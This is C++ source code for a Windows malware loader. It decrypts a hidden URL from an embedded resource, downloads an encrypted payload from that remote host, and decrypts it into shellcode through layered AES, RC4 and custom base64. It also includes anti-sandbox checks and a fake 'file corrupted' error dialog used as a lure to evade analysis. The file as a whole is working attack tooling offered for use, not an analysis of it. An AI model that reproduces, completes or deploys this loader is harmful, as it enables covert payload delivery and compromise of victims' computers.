#include<windows.h>
#include<TlHelp32.h>
#include <string>
#include "./AES.hpp"
#include "base64.hpp"
#include <vector>
#include <random>
#include <wininet.h>
#include <chrono>
#include <filesystem>

namespace fs = std::filesystem;

#pragma comment(lib, "wininet.lib")

unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize);

/**********************************************************************
解密Shellcode代码
**********************************************************************/
void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}

std::string base64Decode(const std::string& input)
{
	const std::string base64Chars = "i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		if (c == '=') {
			break;
		}

		val = (val << 6) | base64Chars.find(c);
		valBits += 6;

		while (valBits >= 8) {
			valBits -= 8;
			output += static_cast<char>((val >> valBits) & 0xFF);
		}
	}

	return output;
}

string FuckWdfAep(const string& strSrc, const char* aeskey) //AES解密
{
	const char* k = aeskey;
	const char* g = "gfdertfghjkuyrtg";
	string strData = ko::Base64::decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(k, g, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

std::string rc4Encrypt(const std::string& input, const std::string& key)
{
	std::vector<unsigned char> S(256);
	for (int i = 0; i < 256; ++i) {
		S[i] = i;
	}

	int j = 0;
	for (int i = 0; i < 256; ++i) {
		j = (j + S[i] + key[i % key.length()]) % 256;
		std::swap(S[i], S[j]);
	}

	int i = 0;
	j = 0;
	std::string output = input;
	for (int k = 0; k < input.length(); ++k) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		output[k] ^= S[(S[i] + S[j]) % 256];
	}

	return output;
}

std::string gFS(int num)
{
	std::string fixedString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";

	std::mt19937 generator(num); // 设置相同的种子值
	std::shuffle(fixedString.begin(), fixedString.end(), generator);

	return fixedString.substr(0, 16); // 取前16位作为固定字符串
}

/**********************************************************************
解密URL代码
**********************************************************************/
std::vector<unsigned char> hex_decode(const std::string& input)
{
	std::vector<unsigned char> decoded_data;

	for (size_t i = 0; i < input.length(); i += 2)
	{
		std::string byte_str = input.substr(i, 2);
		unsigned int byte_value = std::stoul(byte_str, nullptr, 16);
		decoded_data.push_back(static_cast<unsigned char>(byte_value));
	}

	return decoded_data;
}

/**********************************************************************
配置文件
**********************************************************************/
struct CONFIG
{
	BOOL antisandbox;
	BOOL autofish;
	unsigned char key[128];
};

/**********************************************************************
反沙箱
**********************************************************************/
BOOL checkTempFolder()
{
	wchar_t szTempPath[MAX_PATH];
	DWORD dwRetVal = GetTempPathW(MAX_PATH, szTempPath);

	if (dwRetVal > MAX_PATH || (dwRetVal == 0))
	{
		return false;
	}

	// 拼接路径
	wcscat(szTempPath, L"*.*");

	std::wstring tempPath(szTempPath);

	WIN32_FIND_DATAW FindFileData;
	HANDLE hFind = FindFirstFileW(tempPath.c_str(), &FindFileData);

	if (hFind == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	int count = 0;
	do
	{
		count++;
	} while (FindNextFileW(hFind, &FindFileData) != 0);

	FindClose(hFind);

	// 判断文件数量是否小于30
	if (count < 30)
	{
		return false;
	}
	return true;
}

BOOL processname()
{
	TCHAR processName[MAX_PATH];
	GetModuleFileName(NULL, processName, MAX_PATH);
	std::wstring wProcessName(processName);
	std::string processNameStr(wProcessName.begin(), wProcessName.end());
	std::transform(processNameStr.begin(), processNameStr.end(), processNameStr.begin(), ::tolower);

	if (processNameStr.find("sov") == std::string::npos)
	{
		return false;
	}
	return true;
}

BOOL checkDesktopFileCount()
{
	fs::path desktop = fs::path(getenv("USERPROFILE")) / "Desktop";
	int count = 0;
	for (auto& file : fs::directory_iterator(desktop))
	{
		if (fs::is_regular_file(file) || fs::is_directory(file) || fs::is_symlink(file))
		{
			++count;
		}
	}

	if (count <= 10)
	{
		return false;
	}
	return true;
}

void AntiSimulation()
{
	printf("Start\n");
	if (!processname())
	{
		exit(1);
	}
	if (!checkDesktopFileCount())
	{
		exit(1);
	}
	if (!checkTempFolder())
	{
		exit(1);
	}
}

/**********************************************************************
钓鱼模式
**********************************************************************/
DWORD WINAPI ThreadProc(LPVOID lpParameter)
{
	// 提示正在进行补丁检测
	MessageBoxA(NULL, "文件损坏，请更换其它应用程序", "错误", MB_OK);
	return 0;
}

void AutoFishing()
{
	typedef HANDLE(WINAPI* CreateThreadFunc)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	const char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
	CreateThreadFunc createThreadAAddr = (CreateThreadFunc)GetProcAddress(GetModuleHandleA(kernel32), "CreateThread");

	// 创建子线程
	HANDLE hThread = createThreadAAddr(NULL, 0, ThreadProc, NULL, 0, NULL);

	// 关闭子线程句柄
	CloseHandle(hThread);

	static POINT previousPos = { 0 };
	POINT currentPos = { 0 };
	int threshold = 5;
	int duration = 5000; // 时间限制为5秒
	auto startTime = std::chrono::high_resolution_clock::now();
	bool shouldExit = false; // 标志变量，初始值为false
	while (!shouldExit) // 使用标志变量来控制循环
	{
		GetCursorPos(&currentPos); // 更新当前鼠标位置

		if (previousPos.x == 0 && previousPos.y == 0)
		{
			previousPos = currentPos;
			continue;
		}

		int deltaX = currentPos.x - previousPos.x;
		int deltaY = currentPos.y - previousPos.y;

		if (abs(deltaX) > threshold || abs(deltaY) > threshold)
		{
			previousPos = currentPos;
			shouldExit = true; // 设置标志变量为true，退出循环
			break;
		}

		auto currentTime = std::chrono::high_resolution_clock::now();
		auto elapsedTime = std::chrono::duration_cast<std::chrono::milliseconds>(currentTime - startTime).count();

		if (elapsedTime >= duration)
		{
			exit(1);
		}
	}
	if (!shouldExit)
	{
		exit(1);
	}
}

void init(BOOL anti_sandbox, BOOL autofish)
{
	if (autofish)  //钓鱼模式
	{
		AutoFishing();
	}
	if (anti_sandbox)  //反虚拟机
	{
		AntiSimulation();
	}
}

/**********************************************************************
获取Shellcode代码
**********************************************************************/
LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, char* buff)
{
	HINTERNET hSession;
	LPSTR lpResult = NULL;
	hSession = InternetOpen(L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hSession != NULL)
	{
		HINTERNET hRequest;
		hRequest = InternetOpenUrlA(hSession, lpcInterNetURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if (hRequest != NULL)
		{
			DWORD dwBytesRead;
			char szBuffer[614400] = { 0 };
			if (InternetReadFile(hRequest, szBuffer, 614400, &dwBytesRead))
			{
				RtlMoveMemory(buff, szBuffer, 614400);
				return 0;
			}
		}

	}
	return lpResult;
}

unsigned char* GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
{
	//1.Get resource's pointer
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRsrc == NULL)
		return nullptr;
	DWORD totalSize = SizeofResource(NULL, hRsrc);
	if (totalSize == 0)
		return nullptr;
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return nullptr;
	LPVOID pBuffer = LockResource(hGlobal);
	if (pBuffer == NULL)
		return nullptr;
	CONFIG config = { 0 };

	//2.Initialization
	memcpy(&config, pBuffer, sizeof(CONFIG));
	init(config.antisandbox, config.autofish);

	//4.Getshellcode
	shellcodeSize = totalSize - sizeof(CONFIG) - 32;
	char* pByte = new char[shellcodeSize];
	memcpy(pByte, (unsigned char*)pBuffer + sizeof(CONFIG) + 32, shellcodeSize);
	StreamCrypt((unsigned char*)pByte, shellcodeSize, config.key, 128);
	std::string URLencode = pByte;
	std::vector<unsigned char> decoded_URL = hex_decode(base64Decode(URLencode));
	std::string strurl(decoded_URL.begin(), decoded_URL.end());
	char* url = (char*)strurl.data();

	char buff[614400] = { 0 };
	GetInterNetURLText(url, buff);
	string st = buff;
	reverse(st.begin(), st.end());

	//4. GetAESKey
	char* aeskey = new char[33];
	memcpy(aeskey, (unsigned char*)pBuffer + sizeof(CONFIG), 33);
	aeskey[32] = '\0';
	
	//5. DecodeShellcode
	std::string dpD = rc4Encrypt(base64Decode(FuckWdfAep(st, aeskey)), gFS(12468));
	const char* S = dpD.c_str();
	shellcodeSize = dpD.length();
	unsigned char* sc = new unsigned char[shellcodeSize];
	for (int i = 0; i < shellcodeSize; i++)
	{
		sc[i] = S[i];
	}
	return sc;
}
